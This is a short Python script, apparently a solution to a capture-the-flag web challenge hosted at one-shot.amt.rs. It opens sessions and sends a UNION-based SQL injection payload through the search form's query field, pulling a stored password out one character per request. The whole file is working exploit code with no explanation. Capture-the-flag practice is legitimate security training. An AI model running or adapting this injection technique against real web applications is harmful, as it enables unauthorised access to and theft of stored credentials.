import requests


res = requests.post("http://one-shot.amt.rs/new_session").text
good_id = res.split('value="')[1][:16]
print("this is a great id!\n{}".format(good_id))
for i in range(32):
    res = requests.post("http://one-shot.amt.rs/new_session").text
    trash_id = res.split('value="')[1][:16]
    res = requests.post("http://one-shot.amt.rs/search",
                  data={"id":f"{trash_id}", "query":f"J' UNION SELECT SUBSTR(password,{i+1}) FROM table_{good_id}--"}).text
    print(res.split("<li>")[1][:1], end="")
